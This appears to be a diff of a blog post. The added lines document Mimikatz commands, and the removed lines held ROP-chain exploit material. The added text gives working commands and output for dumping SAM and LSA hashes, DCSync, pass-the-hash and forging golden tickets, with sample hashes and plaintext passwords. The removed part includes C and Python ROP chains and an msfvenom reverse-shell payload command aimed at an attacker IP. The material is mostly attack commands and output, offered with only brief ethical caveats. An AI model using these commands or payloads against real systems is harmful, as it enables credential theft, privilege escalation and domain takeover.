+ 0. Microsoft Key Protection Provider
+ ...</code></pre>
+
+
+
+<h3 class="wp-block-heading"><code>stores</code></h3>
+
+
+
+<p class="wp-block-paragraph">Lists logical stores in a system store.</p>
+
+
+
+<h4 class="wp-block-heading">Usage:</h4>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # crypto::stores /systemstore:local_machine</code></pre>
+
+
+
+<h4 class="wp-block-heading">Arguments:</h4>
+
+
+
+<ul class="wp-block-list">
+<li><code>/systemstore</code> &#8211; The system store to use (default: <code>CERT_SYSTEM_STORE_CURRENT_USER</code>). Valid values include <code>CURRENT_USER</code>, <code>LOCAL_MACHINE</code>, <code>LOCAL_MACHINE_GROUP_POLICY</code>, etc.</li>
+</ul>
+
+
+
+<h4 class="wp-block-heading">Output Example:</h4>
+
+
+
+<pre class="wp-block-code"><code>Asking for System Store 'local_machine' (0x00020000)
+ 0. My
+ 1. Root
+ ...</code></pre>
+
+
+
+<h3 class="wp-block-heading"><code>sc</code></h3>
+
+
+
+<p class="wp-block-paragraph">Lists smartcard/token readers on the system and attempts to list keys on the smartcard.</p>
+
+
+
+<h4 class="wp-block-heading">Usage:</h4>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # crypto::sc</code></pre>
+
+
+
+<h4 class="wp-block-heading">Output Example:</h4>
+
+
+
+<pre class="wp-block-code"><code>SmartCard readers:
+ * OMNIKEY CardMan 3x21 0
+ ...</code></pre>
+
+
+
+<h3 class="wp-block-heading"><code>scauth</code></h3>
+
+
+
+<p class="wp-block-paragraph">Creates a client certificate for smartcard authentication, signed by a Certificate Authority.</p>
+
+
+
+<h4 class="wp-block-heading">Usage:</h4>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # crypto::scauth /caname:KiwiAC /upn:user@lab.local /pfx:user.pfx</code></pre>
+
+
+
+<h4 class="wp-block-heading">Arguments:</h4>
+
+
+
+<ul class="wp-block-list">
+<li><code>/caname</code> &#8211; The subject name of the certificate authority.</li>
+
+
+
+<li><code>/castore</code> &#8211; (Optional) The system store containing the certificate authority (default: <code>CERT_SYSTEM_STORE_LOCAL_MACHINE</code>).</li>
+
+
+
+<li><code>/upn</code> &#8211; The User Principal Name (UPN) targeted.</li>
+
+
+
+<li><code>/pfx</code> &#8211; (Optional) Filename for saving the final certificate (default: stored in <code>CERT_SYSTEM_STORE_CURRENT_USER</code>).</li>
+</ul>
+
+
+
+<h4 class="wp-block-heading">Output Example:</h4>
+
+
+
+<pre class="wp-block-code"><code>CA store       : LOCAL_MACHINE
+CA name        : KiwiAC
+...</code></pre>
+
+
+
+<h3 class="wp-block-heading"><code>certificates</code></h3>
+
+
+
+<p class="wp-block-paragraph">Lists certificates and their key properties, with an option to export certificates.</p>
+
+
+
+<h4 class="wp-block-heading">Usage:</h4>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # crypto::certificates /systemstore:local_machine /store:my /export</code></pre>
+
+
+
+<h4 class="wp-block-heading">Arguments:</h4>
+
+
+
+<ul class="wp-block-list">
+<li><code>/systemstore</code> &#8211; (Optional) The system store to use (default: <code>CERT_SYSTEM_STORE_CURRENT_USER</code>).</li>
+
+
+
+<li><code>/store</code> &#8211; (Optional) The store to list/export certificates from (default: <code>My</code>).</li>
+
+
+
+<li><code>/export</code> &#8211; (Optional) Export all certificates to files.</li>
+</ul>
+
+
+
+<h4 class="wp-block-heading">Output Example:</h4>
+
+
+
+<pre class="wp-block-code"><code> * System Store  : 'local_machine' (0x00020000)
+ * Store         : 'my'
+ 0. example.domain.local
+ ...</code></pre>
+
+
+
+<h3 class="wp-block-heading"><code>keys</code></h3>
+
+
+
+<p class="wp-block-paragraph">Lists keys by provider, with an option to export keys.</p>
+
+
+
+<h4 class="wp-block-heading">Usage:</h4>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # crypto::keys /export</code></pre>
+
+
+
+<h4 class="wp-block-heading">Arguments:</h4>
+
+
+
+<ul class="wp-block-list">
+<li><code>/provider</code> &#8211; (Optional) The legacy CryptoAPI provider (default: <code>MS_ENHANCED_PROV</code>).</li>
+
+
+
+<li><code>/providertype</code> &#8211; (Optional) The legacy CryptoAPI provider type (default: <code>PROV_RSA_FULL</code>).</li>
+
+
+
+<li><code>/cngprovider</code> &#8211; (Optional) The CNG provider (default: <code>Microsoft Software Key Storage Provider</code>).</li>
+
+
+
+<li><code>/export</code> &#8211; (Optional) Export all keys to PVK files.</li>
+</ul>
+
+
+
+<h4 class="wp-block-heading">Output Example:</h4>
+
+
+
+<pre class="wp-block-code"><code> * Store         : 'user'
+ * Provider      : 'MS_ENHANCED_PROV' ('Microsoft Enhanced Cryptographic Provider v1.0')
+...</code></pre>
+
+
+
+<h3 class="wp-block-heading"><code>capi</code></h3>
+
+
+
+<p class="wp-block-paragraph">Patches a CryptoAPI function within the Mimikatz process to make unexportable keys exportable. Useful for providers such as:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Microsoft Base Cryptographic Provider v1.0</li>
+
+
+
+<li>Microsoft Enhanced Cryptographic Provider v1.0</li>
+
+
+
+<li>Microsoft Enhanced RSA and AES Cryptographic Provider</li>
+
+
+
+<li>Microsoft RSA SChannel Cryptographic Provider</li>
+
+
+
+<li>Microsoft Strong Cryptographic Provider</li>
+</ul>
+
+
+
+<h4 class="wp-block-heading">Usage:</h4>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # crypto::capi</code></pre>
+
+
+
+<h4 class="wp-block-heading">Output Example:</h4>
+
+
+
+<pre class="wp-block-code"><code>Local CryptoAPI patched</code></pre>
+
+
+
+<h3 class="wp-block-heading"><code>cng</code></h3>
+
+
+
+<p class="wp-block-paragraph">Modifies the KeyIso service in the LSASS process to make unexportable keys exportable. This is specifically useful for the Microsoft Software Key Storage Provider.</p>
+
+
+
+<h4 class="wp-block-heading">Usage:</h4>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # privilege::debug
+mimikatz # crypto::cng</code></pre>
+
+
+
+<h4 class="wp-block-heading">Output Example:</h4>
+
+
+
+<pre class="wp-block-code"><code>"KeyIso" service patched</code></pre>
+
+
+
+<h2 class="wp-block-heading">kerberos</h2>
+
+
+
+<p class="wp-block-paragraph">The Kerberos module in Mimikatz, edited by Benjamin DELPY, allows interaction with Microsoft&#8217;s Kerberos API. This module can operate without any special privileges and facilitates the creation of offline &#8216;Golden tickets&#8217;, which are long-duration TGT (Ticket Granting Ticket) tickets for any user.</p>
+
+
+
+<h3 class="wp-block-heading">Commands Overview</h3>
+
+
+
+<ul class="wp-block-list">
+<li><strong>ptt</strong>: Pass-The-Ticket</li>
+
+
+
+<li><strong>golden / silver</strong>: Create TGT or TGS tickets</li>
+
+
+
+<li><strong>list</strong>: List Kerberos tickets</li>
+
+
+
+<li><strong>tgt</strong>: Display TGT information</li>
+
+
+
+<li><strong>purge</strong>: Purge all Kerberos tickets from the current session</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading">Command Details</h3>
+
+
+
+<h4 class="wp-block-heading">ptt (Pass-The-Ticket)</h4>
+
+
+
+<p class="wp-block-paragraph">Injects one or multiple Kerberos tickets into the current session.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Arguments:</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li><code>filename</code>: The ticket&#8217;s filename (multiple filenames can be used).</li>
+
+
+
+<li><code>directory</code>: A directory path; all <code>.kirbi</code> files inside will be injected.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Example:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi</code></pre>
+
+
+
+<h4 class="wp-block-heading">golden / silver</h4>
+
+
+
+<p class="wp-block-paragraph">Creates Kerberos tickets (TGT or TGS) with arbitrary data for any user.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Common Arguments:</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li><code>/domain</code>: Fully qualified domain name (e.g., chocolate.local).</li>
+
+
+
+<li><code>/sid</code>: SID of the domain (e.g., S-1-5-21-130452501-2365100805-3685010670).</li>
+
+
+
+<li><code>/user</code>: Username to impersonate.</li>
+
+
+
+<li><code>/id</code>: User ID (default is 500 for the Administrator).</li>
+
+
+
+<li><code>/groups</code>: Group IDs the user belongs to (comma-separated).</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Key Arguments:</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li><code>/rc4</code> or <code>/krbtgt</code>: The NTLM hash.</li>
+
+
+
+<li><code>/aes128</code>: The AES128 key.</li>
+
+
+
+<li><code>/aes256</code>: The AES256 key.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Target &amp; Service for Silver Ticket:</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li><code>/target</code>: Server/computer name where the service is hosted.</li>
+
+
+
+<li><code>/service</code>: Service name for the ticket.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Target Ticket:</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li><code>/ticket</code>: Filename for output (default is <code>ticket.kirbi</code>).</li>
+
+
+
+<li><code>/ptt</code>: Inject the golden ticket into the current session without saving to file.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Lifetime Arguments:</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li><code>/startoffset</code>: Start offset (in minutes).</li>
+
+
+
+<li><code>/endin</code>: Duration of the ticket (in minutes).</li>
+
+
+
+<li><code>/renewmax</code>: Maximum renewal duration (in minutes).</li>
+</ul>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi</code></pre>
+
+
+
+<p class="wp-block-paragraph">or</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080</code></pre>
+
+
+
+<h4 class="wp-block-heading">tgt</h4>
+
+
+
+<p class="wp-block-paragraph">Displays information about the TGT of the current session.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Example:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # kerberos::tgt</code></pre>
+
+
+
+<h4 class="wp-block-heading">list</h4>
+
+
+
+<p class="wp-block-paragraph">Lists and exports Kerberos tickets (TGT and TGS) of the current session.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Arguments:</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li><code>/export</code>: Exports all tickets to files.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Example:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # kerberos::list /export</code></pre>
+
+
+
+<h4 class="wp-block-heading">purge</h4>
+
+
+
+<p class="wp-block-paragraph">Purges all tickets of the current session.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Example:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # kerberos::purge</code></pre>
+
+
+
+<h2 class="wp-block-heading">lsadump</h2>
+
+
+
+<p class="wp-block-paragraph">The <code>lsadump</code> module in Mimikatz allows users to interact with various aspects of the Local Security Authority (LSA) and Security Account Manager (SAM) databases. It can extract sensitive information such as password hashes, secrets, and cached credentials. Below is a detailed overview of the commands available in this module, along with examples and usage scenarios.</p>
+
+
+
+<ul class="wp-block-list">
+<li>Ensure you have the necessary privileges to run these commands, especially for sensitive operations.</li>
+
+
+
+<li>Backup your data before performing offline operations.</li>
+
+
+
+<li>Understand the legal and ethical implications of using these tools in your environment. Unauthorized access to systems and data can result in severe consequences.</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading">Commands</h3>
+
+
+
+<ul class="wp-block-list">
+<li><code>sam</code></li>
+
+
+
+<li><code>secrets</code></li>
+
+
+
+<li><code>cache</code></li>
+
+
+
+<li><code>lsa</code></li>
+
+
+
+<li><code>trust</code></li>
+
+
+
+<li><code>backupkeys</code></li>
+
+
+
+<li><code>rpdata</code></li>
+
+
+
+<li><code>dcsync</code></li>
+
+
+
+<li><code>netsync</code></li>
+</ul>
+
+
+
+<h3 class="wp-block-heading"><code>sam</code></h3>
+
+
+
+<p class="wp-block-paragraph">The <code>sam</code> command dumps the Security Account Manager (SAM) database. This database contains NTLM, and sometimes LM, hashes of user passwords. The command can operate in two modes: online and offline.</p>
+
+
+
+<h4 class="wp-block-heading">Online Mode</h4>
+
+
+
+<p class="wp-block-paragraph">To use the <code>sam</code> command online, you must have SYSTEM privileges. If you are not running Mimikatz with SYSTEM privileges, you will receive an access denied error.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Example:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # lsadump::sam</code></pre>
+
+
+
+<p class="wp-block-paragraph">If you encounter an access denied error, you can elevate your privileges using tools like <code>psexec</code> or the <code>token::elevate</code> command in Mimikatz.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Elevating Privileges:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # privilege::debug
+mimikatz # token::whoami
+mimikatz # token::elevate</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>Running the Command Again:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # lsadump::sam</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>Output:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>Domain : VM-W7-ULT-X
+SysKey : 74c159e4408119a0ba39a7872e9d9a56
+
+SAMKey : e44dd440fd77ebfe800edf60c11d4abd
+
+RID  : 000001f4 (500)
+User : Administrateur
+LM   :
+NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0
+
+RID  : 000001f5 (501)
+User : Invité
+LM   :
+NTLM :
+
+RID  : 000003e8 (1000)
+User : Gentil Kiwi
+LM   :
+NTLM : cc36cf7a8514893efccd332446158b1a</code></pre>
+
+
+
+<h4 class="wp-block-heading">Offline Mode</h4>
+
+
+
+<p class="wp-block-paragraph">To use the <code>sam</code> command offline, you need to have the SYSTEM and SAM hive files.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Backing Up Hive Files:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>reg save HKLM\SYSTEM SystemBkup.hiv
+reg save HKLM\SAM SamBkup.hiv</code></pre>
+
+
+
+<p class="wp-block-paragraph">Or use Volume Shadow Copy or BootCD to backup these files:</p>
+
+
+
+<ul class="wp-block-list">
+<li><code>C:\Windows\System32\config\SYSTEM</code></li>
+
+
+
+<li><code>C:\Windows\System32\config\SAM</code></li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Running the Command:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv</code></pre>
+
+
+
+<h3 class="wp-block-heading"><code>secrets</code></h3>
+
+
+
+<p class="wp-block-paragraph">The <code>secrets</code> command extracts LSA secrets, which may contain sensitive information such as service account passwords.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Example:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # lsadump::secrets</code></pre>
+
+
+
+<h3 class="wp-block-heading"><code>cache</code></h3>
+
+
+
+<p class="wp-block-paragraph">The <code>cache</code> command dumps cached domain credentials stored in the LSA.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Example:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # lsadump::cache</code></pre>
+
+
+
+<h3 class="wp-block-heading"><code>lsa</code></h3>
+
+
+
+<p class="wp-block-paragraph">The <code>lsa</code> command interacts with the LSA database to dump user information, including NTLM and Kerberos hashes.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Example:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # lsadump::lsa /id:500</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>Example with Inject:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # lsadump::lsa /inject /name:krbtgt</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>Example with Patch:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # lsadump::lsa /patch</code></pre>
+
+
+
+<h3 class="wp-block-heading"><code>dcsync</code></h3>
+
+
+
+<p class="wp-block-paragraph">The <code>dcsync</code> command uses the DRSR protocol to synchronize a specified entry from a domain controller, effectively simulating the behavior of domain controllers during replication.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Example:</strong></p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # lsadump::dcsync /domain:chocolate.local /user:Administrator</code></pre>
+
+
+
+<h2 class="wp-block-heading">sekurlsa</h2>
+
+
+
+<p class="wp-block-paragraph">The <code>sekurlsa</code> module in Mimikatz is used to extract sensitive information such as passwords, keys, PIN codes, and Kerberos tickets from the memory of the Local Security Authority Subsystem Service (LSASS) process, or from a minidump of it. This information can be crucial for security assessments and penetration testing.</p>
+
+
+
+<h4 class="wp-block-heading">Requirements</h4>
+
+
+
+<p class="wp-block-paragraph">To work with the LSASS process, Mimikatz requires certain privileges:</p>
 
 
 
 <ol class="wp-block-list">
-<li><strong>ROP Gadgets</strong>: Identify the necessary ROP gadgets from <code>ntdll.dll</code>. The gadgets should include:
-<ul class="wp-block-list">
-<li>A gadget to call <code>VirtualProtect()</code>.</li>
+<li><strong>Administrator privileges</strong> to acquire the <code>debug</code> privilege via <code>privilege::debug</code>.</li>
 
 
 
-<li>A gadget to call <code>Sleep()</code>.</li>
-
-
-
-<li>A final gadget to call <code>VirtualProtect()</code> again to revert the memory protection.</li>
-</ul>
-</li>
-
-
-
-<li><strong>Gadget Example</strong>: Here’s how you might find and construct your ROP gadgets.</li>
+<li><strong>SYSTEM account</strong> access via post-exploitation tools, scheduled tasks, or psexec -s. In this case, the debug privilege is not necessary.</li>
 </ol>
 
 
 
-<pre class="wp-block-code"><code>!mona rop -m ntdll.dll -cpb '\x00'</code></pre>
+<p class="wp-block-paragraph">Without these privileges, commands will fail with an error: <code>ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)</code>.</p>
 
 
 
-<p class="wp-block-paragraph">This command will help you find the available ROP gadgets in <code>ntdll.dll</code> while excluding null bytes.</p>
+<h4 class="wp-block-heading">Initial Setup</h4>
 
 
 
-<h4 class="wp-block-heading">Sample Code for DeepSleep</h4>
+<p class="wp-block-paragraph">Start by obtaining necessary privileges and setting up logging:</p>
 
 
 
-<p class="wp-block-paragraph">Here&#8217;s a simple example of how to set up the ROP chain for DeepSleep.</p>
+<pre class="wp-block-code"><code>mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # log sekurlsa.log
+Using 'sekurlsa.log' for logfile : OK</code></pre>
 
 
 
-<pre class="wp-block-code"><code>#include &lt;windows.h&gt;
-#include &lt;stdio.h&gt;
-
-// Function prototype for VirtualProtect
-BOOL VirtualProtect(
-    LPVOID lpAddress,
-    SIZE_T dwSize,
-    DWORD flNewProtect,
-    PDWORD lpflOldProtect
-);
-
-void main() {
-    // Step 1: Prepare the ROP chain
-    // Assuming we have found the following gadgets:
-    // - gadget1: address of VirtualProtect
-    // - gadget2: address of Sleep
-    // - gadget3: address of VirtualProtect again
-
-    // Example addresses for ROP gadgets (replace with actual addresses)
-    ULONG_PTR gadget1 = 0x00000000; // Replace with the actual address for VirtualProtect
-    ULONG_PTR gadget2 = 0x00000000; // Replace with the actual address for Sleep
-    ULONG_PTR gadget3 = 0x00000000; // Replace with the actual address for VirtualProtect
-
-    // Step 2: Build the ROP chain
-    // Create a buffer to hold the ROP chain
-    ULONG_PTR ropChain&#91;6];
-
-    // Push necessary values onto the stack for VirtualProtect
-    ropChain&#91;0] = gadget1; // Address of VirtualProtect
-    ropChain&#91;1] = 0x400;   // Size of the page to modify
-    ropChain&#91;2] = PAGE_EXECUTE_READWRITE; // New protection
-    ropChain&#91;3] = NULL; // Old protection placeholder
-
-    // Call Sleep to suspend execution
-    ropChain&#91;4] = gadget2; // Address of Sleep
-    ropChain&#91;5] = 1000; // Sleep for 1000 ms
-
-    // Step 3: Execute the ROP chain
-    // This is where you would normally trigger the ROP chain execution.
-
-    // For demonstration, we will just call the functions directly
-    VirtualProtect((LPVOID)ropChain&#91;0], ropChain&#91;1], ropChain&#91;2], (PDWORD)ropChain&#91;3]);
-    Sleep(ropChain&#91;5]);
-    VirtualProtect((LPVOID)ropChain&#91;0], ropChain&#91;1], PAGE_READWRITE, (PDWORD)ropChain&#91;3]);
-
-    printf("Executed DeepSleep ROP Chain!\n");
-}</code></pre>
-
-
-
-<p class="wp-block-paragraph">While DeepSleep aims to evade detection, certain behaviors may still be flagged by security tools. For instance, calling <code>VirtualProtect()</code> repeatedly may leave traces in the call stack that security tools can identify. It&#8217;s crucial to continuously assess and adapt the technique to stay ahead of detection mechanisms.</p>
-
-
-
-<h3 class="wp-block-heading">ROPDecoder</h3>
-
-
-
-<p class="wp-block-paragraph">The <strong>ROPDecoder</strong> is essential in bypassing restrictions like <strong>Data Execution Prevention (DEP)</strong> when executing shellcode. It facilitates the modification of &#8220;bad characters&#8221; that can crash the exploit when executed. These bad characters typically include control characters and null bytes that disrupt the execution flow.</p>
-
-
-
-<p class="wp-block-paragraph">by https://zeyadazima.com/exploit%20development/ropdecoder/</p>
-
-
-
-<h4 class="wp-block-heading">Why Do We Need ROPDecoder?</h4>
+<h4 class="wp-block-heading">Commands and Usage</h4>
 
 
 
 <ol class="wp-block-list">
-<li><strong>Bad Character Issues</strong>: When using tools like <code>msfvenom</code>, bad characters are specified with the <code>-b</code> argument (e.g., <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.6 LPORT=1337 -b "\x00\x20\x21"</code>). The shellcode gets encoded to avoid these characters.</li>
-
-
-
-<li><strong>WriteProcessMemory and Execution Permissions</strong>: The <code>WriteProcessMemory</code> API writes data to specified memory locations, which must be writable and executable. If the location has no execution permissions, attempts to decode bad characters can lead to access violations.</li>
+<li><strong>logonpasswords</strong>: Extracts all available logon passwords.</li>
 </ol>
 
 
 
-<h4 class="wp-block-heading">Weaponizing with Gadgets</h4>
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::logonpasswords</code></pre>
 
 
 
-<p class="wp-block-paragraph">Using a target application like <strong>FastBackServer</strong> and analyzing its modules (e.g., <code>CSFTPAV6.dll</code>), we can find gadgets that perform necessary operations:</p>
+<p class="wp-block-paragraph">Output example:</p>
+
+
+
+<pre class="wp-block-code"><code>Authentication Id : 0 ; 88038 (00000000:000157e6)
+Session           : Interactive from 1
+User Name         : Gentil Kiwi
+Domain            : vm-w7-ult
+SID               : S-1-5-21-2044528444-627255920-3055224092-1000
+        msv :
+        &#91;00000003] Primary
+        * Username : Gentil Kiwi
+        * Domain   : vm-w7-ult
+        * LM       : d0e9aee149655a6075e4540af1f22d3b
+        * NTLM     : cc36cf7a8514893efccd332446158b1a
+        * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
+        tspkg :
+        * Username : Gentil Kiwi
+        * Domain   : vm-w7-ult
+        * Password : waza1234/
+        wdigest :
+        * Username : Gentil Kiwi
+        * Domain   : vm-w7-ult
+        * Password : waza1234/
+        kerberos :
+        * Username : Gentil Kiwi
+        * Domain   : vm-w7-ult
+        * Password : waza1234/
+        ssp :
+        &#91;00000000]
+        * Username : admin
+        * Domain   : nas
+        * Password : anotherpassword
+        credman :
+        &#91;00000000]
+        * Username : nas\admin
+        * Domain   : nas.chocolate.local
+        * Password : anotherpassword</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>Pass-The-Hash (pth)</strong>: Runs a process under another credential using the NTLM hash of a user&#8217;s password.</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</code></pre>
+
+
+
+<p class="wp-block-paragraph">Output example:</p>
+
+
+
+<pre class="wp-block-code"><code>user    : Administrateur
+domain  : chocolate.local
+program : cmd.exe
+NTLM    : cc36cf7a8514893efccd332446158b1a
+|  PID  712
+|  TID  300
+|  LUID 0 ; 362544 (00000000:00058830)
+\_ msv1_0   - data copy @ 000F8AF4 : OK !
+\_ kerberos - data copy @ 000E23B8
+\_ rc4_hmac_nt       OK
+\_ rc4_hmac_old      OK
+\_ rc4_md4           OK
+\_ des_cbc_md5       -&gt; null
+\_ des_cbc_crc       -&gt; null
+\_ rc4_hmac_nt_exp   OK
+\_ rc4_hmac_old_exp  OK
+\_ *Password replace -&gt; null</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>tickets</strong>: Lists and exports Kerberos tickets of all sessions.</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::tickets /export</code></pre>
+
+
+
+<p class="wp-block-paragraph">Output example:</p>
+
+
+
+<pre class="wp-block-code"><code>Authentication Id : 0 ; 541043 (00000000:00084173)
+Session           : Interactive from 2
+User Name         : Administrateur
+Domain            : CHOCOLATE
+SID               : S-1-5-21-130452501-2365100805-3685010670-500
+
+    * Username : Administrateur
+    * Domain   : CHOCOLATE.LOCAL
+    * Password : (null)
+
+Group 0 - Ticket Granting Service
+...</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>ekeys</strong>: Extracts encryption keys.</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::ekeys</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>dpapi</strong>: Extracts DPAPI keys.</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::dpapi</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>minidump</strong>: Loads a minidump for offline analysis.</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::minidump lsass.dmp</code></pre>
 
 
 
 <ol class="wp-block-list">
-<li><strong>Types of Gadgets</strong>:
-<ul class="wp-block-list">
-<li><code>add byte [reg]</code></li>
+<li><strong>process</strong>: Switches the process context.</li>
 
 
 
-<li><code>sub byte [reg]</code></li>
+<li><strong>searchpasswords</strong>: Searches for passwords in memory.</li>
 
 
 
-<li>Bitwise operations (<code>ror</code>, <code>rol</code>, <code>shr</code>, <code>shl</code>, <code>or</code>, <code>and</code>)</li>
-</ul>
-</li>
+<li><strong>msv</strong>: Lists MSV credentials.</li>
 
 
 
-<li><strong>Example Gadgets</strong>:
-<ul class="wp-block-list">
-<li><code>0x5050626e: add byte [esi+0x3B], ah ; ret ;</code> (decoding gadget)</li>
-</ul>
-</li>
+<li><strong>wdigest</strong>: Lists WDigest credentials.</li>
+
+
+
+<li><strong>kerberos</strong>: Lists Kerberos credentials.</li>
 </ol>
 
 
 
-<h4 class="wp-block-heading">Steps for ROP Decoding</h4>
+<h4 class="wp-block-heading">Example of extracting logon passwords from a minidump</h4>
 
 
 
-<p class="wp-block-paragraph">To decode bad characters using the identified gadgets, follow these steps:</p>
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords</code></pre>
+
+
+
+<p class="wp-block-paragraph">Starting with Windows 8.x and 10, passwords are not stored in memory by default. However, there are exceptions such as when the DC is unreachable or specific registry settings are configured to store credentials.</p>
+
+
+
+<h2 class="wp-block-heading">Memory Dump</h2>
+
+
+
+<p class="wp-block-paragraph">This guide details the process of extracting passwords from memory dumps using various formats such as minidump, full dump, crashdump, vmem, and hibernation files (hiberfil.sys).</p>
+
+
+
+<ul class="wp-block-list">
+<li>Ensure you have the necessary privileges to access and analyze the memory dumps.</li>
+
+
+
+<li>Minidumps from different Windows versions or architectures might produce errors if incompatible.</li>
+
+
+
+<li>Always adhere to ethical guidelines and legal requirements when using tools like Mimikatz.</li>
+</ul>
+
+
+
+<h4 class="wp-block-heading">Memory Dump Formats</h4>
 
 
 
 <ol class="wp-block-list">
-<li><strong>Make <code>esi + 0x3B</code> Point to the Bad Character</strong>:
-<ul class="wp-block-list">
-<li>Use gadgets to calculate the correct pointer.</li>
-</ul>
-</li>
+<li><strong>Minidump</strong></li>
 
 
 
-<li><strong>Pop the Decoding Value into <code>eax</code></strong>:
-<ul class="wp-block-list">
-<li>This value is used to add to the memory location where the bad character resides.</li>
-</ul>
-</li>
+<li><strong>Full Dump</strong></li>
 
 
 
-<li><strong>Execute the Decoding Gadget</strong>:
-<ul class="wp-block-list">
-<li>Use the <code>add</code> instruction to modify the byte at the location pointed to by <code>esi</code>.</li>
-</ul>
-</li>
+<li><strong>Crashdump</strong></li>
+
+
+
+<li><strong>VMem and Other Raw Formats</strong></li>
+
+
+
+<li><strong>Hibernation File (hiberfil.sys)</strong></li>
 </ol>
 
 
 
-<h4 class="wp-block-heading">Example ROP Decoder Code</h4>
+<p class="wp-block-paragraph">Each of these formats contains memory snapshots that can be analyzed to extract sensitive information such as passwords, keys, PIN codes, and tickets.</p>
 
 
 
-<p class="wp-block-paragraph">Here&#8217;s an example of how to construct the ROP chain for decoding bad characters.</p>
+<h3 class="wp-block-heading">Using Mimikatz to Extract Passwords</h3>
 
 
 
-<pre class="wp-block-code"><code>from struct import pack
-
-# ROP Decoder Construction
-ROPDecoder = b""
-ROPDecoder += pack("&lt;L", 0x5050118e)  # mov eax, esi ; pop esi ; ret ;
-ROPDecoder += pack("&lt;L", 0x41414141)  # dummy value for pop esi
-ROPDecoder += pack("&lt;L", 0x5052db24)  # pop ecx ; ret ;
-ROPDecoder += pack("&lt;L", negative_offset_value_to_shellcode)  # negative offset
